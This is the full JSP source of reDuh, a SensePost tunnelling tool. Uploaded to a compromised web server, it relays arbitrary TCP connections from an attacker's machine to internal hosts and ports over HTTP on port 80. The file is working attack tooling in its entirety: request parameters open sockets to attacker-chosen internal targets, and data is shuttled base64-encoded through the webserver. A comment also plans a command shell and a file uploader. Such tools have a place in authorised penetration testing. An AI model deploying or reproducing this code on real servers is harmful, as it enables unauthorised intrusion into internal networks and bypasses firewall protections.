<%
/**
  * The name? redirector.jsp ==> redir.jsp ==> reDuh.jsp
  *
  * -reDuh allows us to tunnel TCP traffic to any machine:port pair through a webserver which is only open on port 80.
  * -If you don't know why this is useful, you probably don't need it.
  *
  * Like this:
  * 
  *   [Internal Machine]     ___[Webserver]___            [Attacker Machine]
  *            /----<---<---|   reDuh.jsp     |<----[reDuhClient] <---[Client Application]
  *            | n          |   pipedInput    | 80         |          |	n	   |
  *  [listening service]--->|   pipedOutput   |---->--->---/          \------^
  *                         \_________________/
  *
  *	Glenn Wilkinson :: SensePost
  *	glenn@sensepost.com
  **/	
%>


<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>

<%!
String s_path=null;		//Used to store webroot
int DEBUG_LEVEL = 1;
%>

<%
//Helper Class:: Queue String
class QString{
	private int numElements=-1;	
	Node n_front = null;
	Node n_tail = null;
	
	public void add(String _elem){
		Node newNode = new Node(_elem);
		if(n_front==null){
			n_front=newNode;
			n_tail=newNode;
		}
		else{
			n_tail.setPrev(newNode);
			n_tail=newNode;
		}
	}
	
	public String poll(){
		if(n_front!=null){
			String frontElement = n_front.getData();
			n_front = n_front.getPrev();
			return frontElement;
		}
		else
			return null;
	}
	
	public String peek(){
		if(n_front!=null)
			return n_front.getData();
		else
			return null;
	}
	
	class Node{
		String nodeData=null;
		Node prevNode=null;
		
		Node(String _data){
			nodeData = _data;
		}
		
		public String getData(){
			return nodeData;
		}
		
		public void setPrev(Node _prev){
			prevNode=_prev;
		}
		
		public Node getPrev(){
			return prevNode;
		}
	}
}//End Queue String

%>

<%
class reDuh extends Thread{
	ServerSocket srv=null; //IPC Communication service
	boolean runServerThread=true;
	boolean servicePortBound=false;
	redirectorProcessComm rPC;
	int servicePort=-1;
	boolean searchingForPort=true;
	Hashtable connectionPool = new Hashtable();
	Hashtable sequenceNumbers = new Hashtable();
	QString outputFromSockets = new QString();
	
	int delay=100;
	

	//1. Read from target socket
	//2. Encode to base64
	//3. Push base64 encoding to <target:port:sockNum> queue
	class redirectorGD extends Thread{
		String target=null;
		int port=-1;
		int sockNum=-1;
		InputStream fromClient=null;		
	
		//Constructor		
		redirectorGD(String _tgt, int _prt, int _sockNum, InputStream _fromClient){
			target=_tgt;
			port=_prt;
			sockNum=_sockNum;
			fromClient=_fromClient;	
		}			
		
		/** Read from socket, encode, write to piped output queue **/
		public void run(){		
			int bufferSize = 8000;
			byte[] buffer = new byte[bufferSize];
			int numberRead=0;
			boolean moreData=true;
			
			try{	
			while(moreData){
				numberRead=fromClient.read(buffer,0,bufferSize);
				if(DEBUG_LEVEL>0)
					System.out.println(target +":"+port + ":" + sockNum  + " ===> RemoteClient (" + numberRead + " bytes");
								
				if(numberRead<0){
					//Read end of data. Let's close connections
					if(DEBUG_LEVEL>0)
						System.out.println("Read end of data. Let's close connections.");
					outputFromSockets.add("[data]"+target+":"+port+":"+sockNum+":*");		//Send dat of "*" to indicate and EOT 
					moreData=false;
					connectionPool.remove(target+":"+port+":"+sockNum);
				}
				else if(numberRead<bufferSize){
					byte[] tmpBuffer = new byte[numberRead];
					for(int k=0; k<numberRead; k++)
						tmpBuffer[k]=buffer[k];											
						outputFromSockets.add("[data]"+target+":"+port+":"+sockNum+":"+new String(encode(tmpBuffer)));
				}
				else{
						outputFromSockets.add("[data]"+target+":"+port+":"+sockNum+":"+new String(encode(buffer)));
				}
				Thread.sleep(delay);
				
			}
			}catch(Exception e){
				//Socket closed, for whatever reason
			}finally{
				outputFromSockets.add("[data]"+target+":"+port+":"+sockNum+":*");			//Send the EOT character
				
			}			
		}					
		
	}//redirector class		


	//1. Poll <target:port:n> queue for base64 data
	//2. Decode base64 data
	//3. Send decoded data to <target:port:n> socket
	class redirectorSD extends Thread{
		String target=null;
		int port=-1;
		int sockNum=-1;
		OutputStream toClient=null;
		
		redirectorSD(String _tgt, int _prt, int _sockNum, OutputStream _toClient){
			target=_tgt;
			port=_prt;
			sockNum=_sockNum;			
			toClient=_toClient;			
		}
		
		//Poll <target:port:n> buffer for data. If there is data, decode it and send it to the <target:port> socket.
		public synchronized void run(){
			String input=null;
			boolean endOfTransmission=false;
			
			try{
				while(!endOfTransmission){ 
							while( (input= ((QString)connectionPool.get(target+":"+port+":"+sockNum)).poll()) != null)
							{
							String seqNum=input.substring(0,input.indexOf(":"));
							input=input.substring(input.indexOf(":")+1); //Chuck seq number prefix
							byte[] tmp=null;
							int bytesReadFromHomePort=0;								
							if(input.compareTo("*")!=0){
								//Decode 4 characters at a time
								input = input.replace(' ','+');
								for(int k=0; k< input.length(); k+=4){
										String inputChunk = input.substring(k,k+4);
										tmp=decode(inputChunk.getBytes());
										bytesReadFromHomePort+=tmp.length;
										toClient.write(tmp);
									}
								if(DEBUG_LEVEL>0)
									System.out.println(target +":"+port + ":" + sockNum  + ":" +seqNum+ " <=== RemoteClient (" + bytesReadFromHomePort + " bytes)");
							}
							else{ //A star marks the EOF
								endOfTransmission=true;
								connectionPool.remove(target+":"+port+":"+sockNum);
								sequenceNumbers.remove(target+":"+port+":"+sockNum);
							}
						}
						Thread.sleep(delay);	 
				}

			}catch(Exception e){
				//System.err.println("Exception-" + e);
			}																	
		}
	}//class redirectorSD

	
	//Spawns a new thread for each inbound server communication 
	class connHandler extends Thread{
		Socket sock=null;
		PrintWriter rwP = null;
		BufferedReader rdP = null;			
		String req=null;
		String data=null;	
		
		connHandler(Socket conn){
			sock=conn;
		}
		
		
		public synchronized void run(){
			String tag=null;
	
				try{
					rdP = new BufferedReader(new InputStreamReader(sock.getInputStream()));
					rwP = new PrintWriter(sock.getOutputStream(), true);
					while(   (req=rdP.readLine()) != null    ){
						
					tag=req.substring( req.indexOf("[")+1, req.indexOf("]") );

					/*GETDATA FOR HAROON*/
					if(tag.compareTo("getData") == 0){					//Polll method. This will return whatever data's in the outputFromSockets queue
					
						data=outputFromSockets.poll();
						if(data!=null)
							rwP.println(data);						
						else
							rwP.println("[NO_NEW_DATA]");
//						sock.close();
						
					}						
					
					/*BUMP SERVICE PORT ONTO DATA QUEUE*/
					if(tag.compareTo("Port") == 0){
						outputFromSockets.add("[Port]"+servicePort);
					}
					
					/*NEWDATA*/
					else if(tag.compareTo("newData") == 0){
						String tokens[] = (req.substring(( req.indexOf("]")+1))).split(":");
													
						String tgt=tokens[0];
						String prt=tokens[1];
						String sockNum=tokens[2];
						int seqNum=Integer.parseInt(tokens[3]);
						String data=tokens[4];
						
						//Note: The silliness with ints/integers relates to Java<1.4 and its fail to cast
						if(connectionPool.containsKey(tgt+":"+prt+":"+sockNum)){
								if(((Integer)sequenceNumbers.get(tgt+":"+prt+":"+sockNum)).intValue() == -1){		//First piece of data
									sequenceNumbers.put(tgt+":"+prt+":"+sockNum,(new Integer(seqNum)));
									((QString)connectionPool.get(tgt+":"+prt+":"+sockNum)).add(seqNum+":"+data);
								}
								else{
									int prevSeqNum = ((Integer)sequenceNumbers.get(tgt+":"+prt+":"+sockNum)).intValue();
									
									if(DEBUG_LEVEL>0){
										if(prevSeqNum!= (seqNum-1))									 
											System.out.println("### Out of order data - " + prevSeqNum +" and " + seqNum + ". Waiting for seqNum " + (seqNum-1));
									}
									
									while (prevSeqNum != (seqNum-1)){	//Wait for the missing (n-1) seq number to catch up in its thread									
										try{
											Thread.sleep(200);
											prevSeqNum = ((Integer)sequenceNumbers.get(tgt+":"+prt+":"+sockNum)).intValue();
										}catch(Exception e){}
									}
										sequenceNumbers.put(tgt+":"+prt+":"+sockNum,(new Integer(seqNum)));
										((QString)connectionPool.get(tgt+":"+prt+":"+sockNum)).add(seqNum+":"+data);
									}									
						}	
						else{
							if(data.compareTo("*") != 0){
								if(DEBUG_LEVEL>0)
									System.out.println("Trying to add data to nonexistent socket buffer - " + tgt+":"+prt+":"+sockNum);
								rwP.println("[Error]Trying to add data to nonexistent socket - " + tgt+":"+prt+":"+sockNum);
							}
						}
						//sock.close();
					}	
					/*SHUTDOWN*/				
					else if(tag.compareTo("shutdown") ==0 ){
						if(DEBUG_LEVEL>0)
							System.out.println("Shutting down service");
						runServerThread=false;							
						srv.close();							
					}
					/*CREATE SOCKET*/
					else if(tag.compareTo("createSocket")==0){
						String tgt=req.substring(req.indexOf("]")+1, req.indexOf(':') );
						int prt=Integer.parseInt(   req.substring(req.indexOf(':')+1,req.lastIndexOf(":"))    );
						int sockNum= Integer.parseInt(req.substring(req.lastIndexOf(":")+1));
						
						if(connectionPool.containsKey(tgt+":"+prt+":"+sockNum)){
							if(DEBUG_LEVEL>0)
								System.out.println("[Error]Trying to create duplicate hashmap key - " +tgt+":"+prt+":" + sockNum);
							rwP.println("[Error]Trying to create duplicate hashmap key - " +tgt+":"+prt+":" + sockNum);
						}
						else{
							if(DEBUG_LEVEL>0)
								System.out.println("Attempting to create socket " + tgt + ":" + prt+" (Number "+sockNum+")");
							boolean socketSuccess=true;
							Socket tmpSocket=null;
							try{
								tmpSocket = new Socket(tgt,prt);	
							}catch(Exception e){
									rwP.println("[Error]Cannot create socket " +tgt+":"+prt);
								socketSuccess=false;
							}
							if(socketSuccess){								
								connectionPool.put(tgt+":"+prt+":"+sockNum,new QString());
								sequenceNumbers.put(tgt+":"+prt+":"+sockNum,new Integer(-1));
								OutputStream toClient = tmpSocket.getOutputStream();
								InputStream fromClient = tmpSocket.getInputStream();							
								redirectorSD sendDataToTarget = new redirectorSD(tgt,prt,sockNum,toClient);
								redirectorGD getDataFromTarget = new redirectorGD(tgt,prt,sockNum,fromClient);
								sendDataToTarget.start();
								getDataFromTarget.start();				
								rwP.println("[Info]Successfully created socket " +tgt+":"+prt+" (Number " + sockNum + ")");
								sendDataToTarget.join();
								rwP.println("[Info]Socket closed for " +tgt+":"+prt+" (Number " + sockNum + ")");
								if(DEBUG_LEVEL>0)
									System.out.println("[Info]Socket closed for " +tgt+":"+prt+" (Number " + sockNum + ")");
								tmpSocket.close();
							}
						}
					}
					Thread.sleep(delay);
				}		


				}catch(Exception e){
					System.err.println("[Exception]Service Thread Exception - " + e);
					return;
				}		
		}
		
	}//newConn class	

	/**
	* Data gets passed from other reDuh.jsp process to this port in form: [<targetIP>:targetPort]<Base64Data>
	* We must strip off the header, and then place the data into the relevant connectionPool.targetIP.byteInputQueue	
	**/
	class redirectorProcessComm extends Thread{		
		
		Socket sock=null;
		String input=null;	
		connHandler newConnection=null;	
		int boundToPort=0;
		
		redirectorProcessComm(){
			
			try{
				srv = new ServerSocket(servicePort);
			}catch(Exception e){
				if(DEBUG_LEVEL>0)
					System.out.println("Cannot bind to port " + servicePort + " - "  + e);
				boundToPort=-1;
			}
			if(boundToPort!=-1){
				boundToPort=1;			
				if(DEBUG_LEVEL>0)	
					System.out.println("IPC service bound to " + servicePort);	
			}
			else{
				if(DEBUG_LEVEL>0)	
					System.out.println("IPC service failed to bind to " + servicePort);	
			}
		}					
		public void run(){

			while(runServerThread){		
					try{
						sock=srv.accept();	//This blocks. May pose problem. I'll have to send a 'null' connect to unblock it.
					}catch(Exception e){
						System.err.println("*Unable to receive connection on port " + servicePort + ". The service has probably been shutdown. " + e);
						return;
					}
					
					newConnection = new connHandler(sock);
					newConnection.start();
			
			}	
			
			try{
				srv.close();
			}catch(Exception e){
				if(DEBUG_LEVEL>0)
					System.out.println("Could not close server connection " + e);
			}
			if(DEBUG_LEVEL>0)
				System.out.println("Exiting thread for proc comm stuff. Server thingum shutting down");							
		}

	}	
	
	reDuh(int _p){		
		servicePort=_p;
	}
	
	public void run(){
		try{
			rPC = new redirectorProcessComm();
			rPC.start();
			rPC.join();
		}catch(Exception e){};
	}
	
	int getServicePort() throws Exception{
		if(DEBUG_LEVEL>0)		
			System.out.println("Waiting for bind");
		while(!servicePortBound){}	
		if(DEBUG_LEVEL>0)
			System.out.println("Bound on " + servicePort);
		return servicePort;
	}
	
	
}	


/*     main() function:
*****************************/

	//Vars from request
	String data=null;
	String action=null;
	String tmpTargetPort=null;
	String tmpPCPort=null;
	String targetHost=null;
	String cmd=null;
	String socketNumber=null;
	String sequenceNumber=null;
	int targetPort=-1;
	int servicePort=-1;
	
	//Vars to use to speak to the service on sevice port
	Socket rpcSock=null;
	PrintWriter rw = null;
	BufferedReader rd = null;
	
	s_path=application.getRealPath(request.getServletPath()); //May be useful at some point. s_path will contain the webroot dir where the JSP sits
	
	/** Process Request **/	 
	action=request.getParameter("action");
	cmd=request.getParameter("command");
	targetHost=request.getParameter("targetHost");
	tmpTargetPort=request.getParameter("targetPort");
	if(tmpTargetPort!=null)
		targetPort=Integer.parseInt(tmpTargetPort);
	data=request.getParameter("data");
	tmpPCPort=request.getParameter("servicePort");
	if(tmpPCPort!=null)
		servicePort=Integer.parseInt(tmpPCPort);
	socketNumber=request.getParameter("socketNumber");	
	sequenceNumber=request.getParameter("sequenceNumber");	
	
	if( action == null){
		//TODO: If no args are passed, have some sort of management interface, giving options to load command shell, file uploader etc
		out.println("[reDuhError]Undefined Request");
	}
	else if (action.compareTo("checkPort")==0){
		if(request.getParameter("port") != null){
			try{
				int port = Integer.parseInt(request.getParameter("port"));
				ServerSocket tmpServerSocket = new ServerSocket(port);
				out.println("Success testing port " + port);
				tmpServerSocket.close();				
			}catch(Exception e ){
				out.println("[Exception] " + e);
			}
			out.flush();
		}
	}
	else if(action.compareTo("startReDuh")==0){
		if(servicePort==-1){
			out.println("ERROR: Bad service port - " + servicePort +". Did your request pass one?");
			if(DEBUG_LEVEL>0)
				System.out.println("ERROR: Bad service port - " + servicePort);			
		}
		else{
			
			//This will start a listening service through which we will communicate to our script. The script will create sockets, pass data, and get data etc through this port.
			reDuh redirector = new reDuh(servicePort);			//Create our redirector
			redirector.start();
			out.println("The airplane flies high, looks left, turns right");		//This won't be seen or caught anywhere.
			out.flush();
			redirector.join();
		}		 
	}
	else if(action.compareTo("getData")==0){
		if(servicePort==-1){
			out.println("ERROR: Bad service port - " + servicePort);
			if(DEBUG_LEVEL>0)
				System.out.println("ERROR: Bad service port - " + servicePort);
		}
		else{
			rpcSock = new Socket("localhost", servicePort);				 
			rw = new PrintWriter(rpcSock.getOutputStream(), true);
			rd = new BufferedReader(new InputStreamReader(rpcSock.getInputStream()));				
			rw.println("[getData]");
			String input=null;
			input=rd.readLine();
			out.println(input);
			out.flush();
			rw.close();
			rd.close();
			rpcSock.close();	
		}
	}
	
	else if(action.compareTo("killReDuh")==0){
		if(servicePort==-1){
			out.println("ERROR: Bad service port - " + servicePort);
			if(DEBUG_LEVEL>0)
				System.out.println("ERROR: Bad service port - " + servicePort);
		}
		else{		
			try{
				rpcSock = new Socket("localhost", servicePort);					//NB Make sure the client program reads the result of the creation of the reDuh object to see what port it started on
				rw = new PrintWriter(rpcSock.getOutputStream(), true);
				rw.println("[shutdown]");
				rw.close();
				rpcSock.close(); 
				out.println("[Info]Shutdown complete");
			}catch(ConnectException e){
				out.println("[Error]Cannot connect to reDuh service on port " + servicePort);
			}
		}
		
	}	
	else if(action.compareTo("createSocket")==0){
		if(targetPort==-1 || targetHost==null || socketNumber==null || servicePort==-1)
			out.println("ERROR:Bad port or host or socketNumber for creating new socket");				
		else{
			//Create new socket
			try{
				rpcSock = new Socket("localhost", servicePort);					//NB Make sure the client program reads the result of the creation of the reDuh object to see what port it started on
				rw = new PrintWriter(rpcSock.getOutputStream(), true);
				rd = new BufferedReader(new InputStreamReader(rpcSock.getInputStream()));				
				rw.println("[createSocket]" + targetHost + ":" + targetPort +":"+socketNumber);
				String foo=null;
				out.println(rd.readLine());
				rw.close();
				rpcSock.close(); 			
		}catch(ConnectException e){
			out.println("[Error]Cannot connect to reDuh service on port " + servicePort);
		}				

		}
	}	
	else if(action.compareTo("newData")==0){
		if(targetPort==-1 || targetHost==null || data==null || socketNumber==null || sequenceNumber==null || servicePort==-1)
			out.println("ERROR:Bad port, or host, or blank data for posting new data");
		else{
			//Put new string array data into connectionPool.target_input.queue
			try{			
				rpcSock = new Socket("localhost", servicePort);					//NB Make sure the client program reads the result of the creation of the reDuh object to see what port it started on
				rw = new PrintWriter(rpcSock.getOutputStream(), true);
//				rd = new BufferedReader(new InputStreamReader(rpcSock.getInputStream()));				 //add some sort of Md5 here?
				rw.println("[newData]" + targetHost + ":" + targetPort+":"+socketNumber+":"+sequenceNumber+":"+data);
				out.println("Caught data with sequenceNumber " + sequenceNumber);
				rw.close();
				rpcSock.close();					
				}catch(Exception e){
					out.println("[Error]Unable to connect to reDuh.jsp main process on port " +servicePort+". Is it running? -> " + e);
				}
		}			
	}
	else if(action.compareTo("debug")==0){	
		out.println("<h3>DEBUG:");
		//
		out.println("<h3>:DEBUG END");
	}	

	else{
		out.println("[REDUH]ERROR:Undefined action paramter");
	}

%>





<%!

    /**
     * Encodes a String into a base 64 String. The resulting encoding is chunked at 76 bytes.
     * <p>
     * @param s String to encode.
     * @return encoded string.
     *
     */
    public static String encode(String s) {
        byte[] sBytes =  s.getBytes();
        sBytes = encode(sBytes);
        s = new String(sBytes);
        return s;
    }

    /**
     * Decodes a base 64 String into a String.
     * <p>
     * @param s String to decode.
     * @return encoded string.
     * @throws java.lang.IllegalArgumentException thrown if the given byte array was not valid com.sun.syndication.io.impl.Base64 encoding.
     *
     */
    public static String decode(String s) throws IllegalArgumentException {
        s = s.replaceAll("\n", "");
        s = s.replaceAll("\r", "");
        byte[] sBytes = s.getBytes();
        sBytes = decode(sBytes);
        s = new String(sBytes);
        return s;
    }


    private static final byte[] ALPHASET =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".getBytes();

    private static final int I6O2 = 255 - 3;
    private static final int O6I2 = 3;
    private static final int I4O4 = 255 - 15;
    private static final int O4I4 = 15;
    private static final int I2O6 = 255 - 63;
    private static final int O2I6 = 63;

    /**
     * Encodes a byte array into a base 64 byte array.
     * <p>
     * @param dData byte array to encode.
     * @return encoded byte array.
     *
     */
    public static byte[] encode(byte[] dData) {
        if (dData==null) {
            throw new IllegalArgumentException("Cannot encode null");
        }
        byte[] eData = new byte[((dData.length+2)/3)*4];

        int eIndex = 0;
        for (int i = 0; i<dData.length; i += 3) {
            int d1;
            int d2=0;
            int d3=0;
            int e1;
            int e2;
            int e3;
            int e4;
            int pad=0;

            d1 = dData[i];
            if ((i+1)<dData.length) {
                d2 = dData[i+1];
                if ((i+2)<dData.length) {
                    d3 = dData[i+2];
                }
                else {
                    pad =1;
                }
            }
            else {
                pad =2;
            }

            e1 = ALPHASET[(d1&I6O2)>>2];
            e2 = ALPHASET[(d1&O6I2)<<4 | (d2&I4O4)>>4];
            e3 = ALPHASET[(d2&O4I4)<<2 | (d3&I2O6)>>6];
            e4 = ALPHASET[(d3&O2I6)];

            eData[eIndex++] = (byte)e1;
            eData[eIndex++] = (byte)e2;
            eData[eIndex++] = (pad<2) ?(byte)e3 : (byte)'=';
            eData[eIndex++] = (pad<1) ?(byte)e4 : (byte)'=';

        }
        return eData;
    }

    private final static int[] CODES = new int[256];

    static {
        for (int i=0;i<CODES.length;i++) {
            CODES[i] = 64;
        }
        for (int i=0;i<ALPHASET.length;i++) {
            CODES[ALPHASET[i]] = i;
        }
    }

    /**
     * Dencodes a com.sun.syndication.io.impl.Base64 byte array.
     * <p>
     * @param eData byte array to decode.
     * @return decoded byte array.
     * @throws java.lang.IllegalArgumentException thrown if the given byte array was not valid com.sun.syndication.io.impl.Base64 encoding.
     *
     */
    public static byte[] decode(byte[] eData) {
        if (eData==null) {
            throw new IllegalArgumentException("Cannot decode null");
        }
        byte[] cleanEData = (byte[]) eData.clone();
        int cleanELength = 0;
        for (int i=0;i<eData.length;i++) {
            if (eData[i]<256 && CODES[eData[i]]<64) {
                cleanEData[cleanELength++] = eData[i];
            }
        }

        int dLength = (cleanELength/4)*3;
        switch (cleanELength%4) {
            case 3:
                dLength += 2;
                break;
            case 2:
                dLength++;
                break;
        }

        byte[] dData = new byte[dLength];
        int dIndex = 0;
        for (int i = 0; i < eData.length; i += 4) {
            if ((i + 3) > eData.length) {
                throw new IllegalArgumentException("byte array is not a valid com.sun.syndication.io.impl.Base64 encoding");
            }
            int e1 = CODES[cleanEData[i]];
            int e2 = CODES[cleanEData[i+1]];
            int e3 = CODES[cleanEData[i+2]];
            int e4 = CODES[cleanEData[i+3]];
            dData[dIndex++] = (byte) ((e1<<2)|(e2>>4));
            if (dIndex<dData.length) {
                dData[dIndex++] = (byte) ((e2<<4) | (e3>>2));
            }
            if (dIndex<dData.length) {
                dData[dIndex++] = (byte) ((e3<<6) | (e4));
            }
        }
        return dData;
    }	
%>